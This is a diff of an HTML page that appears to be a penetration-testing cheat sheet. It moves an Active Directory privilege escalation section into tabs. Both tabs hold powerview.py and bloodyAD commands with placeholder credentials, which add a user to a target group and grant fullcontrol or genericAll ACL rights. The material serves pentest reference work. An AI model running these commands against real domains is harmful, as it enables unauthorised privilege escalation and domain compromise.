@@ -204,8 +204,12 @@
 
 <div class="content"><hr>
 <h3 id="privesc-1-add-self-to-group-from-linux">Privesc #1: Add self to group (From Linux)</h3>
-<h4 id="powerviewpy">powerview.py</h4>
-<p><a href="https://github.com/aniqfakhrul/powerview.py">powerview.py</a></p>
+<p>
+<button data-tabset="set1" data-tabcontent="tab1" class="active">powerview.py</button>
+
+<button data-tabset="set1" data-tabcontent="tab2" >bloodyAD</button>
+
+<div class="tabcontent" data-tabset="set1" data-tabcontent="tab1"><div>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Connect</span>
 </span></span><span class="line"><span class="cl">sudo ntpdate -s &lt;DC&gt; <span class="o">&amp;&amp;</span> powerview &lt;DOMAIN&gt;/&lt;USERNAME&gt;:&lt;PASSWORD&gt;@&lt;TARGET_DOMAIN&gt;
 </span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Add self to group</span>
@@ -216,12 +220,17 @@
 </span></span><span class="line"><span class="cl">Add-DomainObjectAcl -TargetIdentity &lt;ANOTHER_GROUP&gt; -PrincipalIdentity &lt;USERNAME&gt; -Rights fullcontrol
 </span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Check</span>
 </span></span><span class="line"><span class="cl">Get-DomainObjectAcl -Identity &lt;TARGET_USER_IN_ANOTHER_GROUP&gt; -Where <span class="s2">&#34;SecurityIdentifier contains &lt;USERNAME&gt;&#34;</span>
-</span></span></code></pre></div><h4 id="bloodad">bloodAD</h4>
-<p><a href="https://github.com/CravateRouge/bloodyAD">bloodyAD</a></p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">python3 bloodyAD.py -d &lt;DOMAIN&gt; -u &lt;USERNAME&gt; -p &lt;PASSWORD&gt; --host &lt;DC&gt; add groupMember &lt;TARGET_GROUP&gt; &lt;USERNAME&gt;
+</span></span></code></pre></div></div>
+<p><small><em>Ref: <a href="https://github.com/aniqfakhrul/powerview.py">powerview.py</a></em></small></p></div>
+
+<div class="tabcontent" data-tabset="set1" data-tabcontent="tab2"><div>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Add self to group</span>
+</span></span><span class="line"><span class="cl">python3 bloodyAD.py -d &lt;DOMAIN&gt; -u &lt;USERNAME&gt; -p &lt;PASSWORD&gt; --host &lt;DC&gt; add groupMember &lt;TARGET_GROUP&gt; &lt;USERNAME&gt;
 </span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># After getting full control of target group (e.g. TARGET_GROUP has genericall over ANOTHER_GROUP)</span>
 </span></span><span class="line"><span class="cl">python3 bloodyAD.py -d &lt;DOMAIN&gt; -u &lt;USERNAME&gt; -p &lt;PASSWORD&gt; --host &lt;DC&gt; add genericAll <span class="s1">&#39;OU=&lt;ANOTHER_GROUP&gt;,DC=&lt;EXAMPLE&gt;,DC=&lt;COM&gt;&#39;</span> &lt;USERNAME&gt;
-</span></span></code></pre></div><br></div></div>
+</span></span></code></pre></div></div>
+<p><small><em>Ref: <a href="https://github.com/CravateRouge/bloodyAD">bloodyAD</a></em></small></p></div></p>
+<br></div></div>
     
     <script src="/js/utils.js"></script>
     <footer>
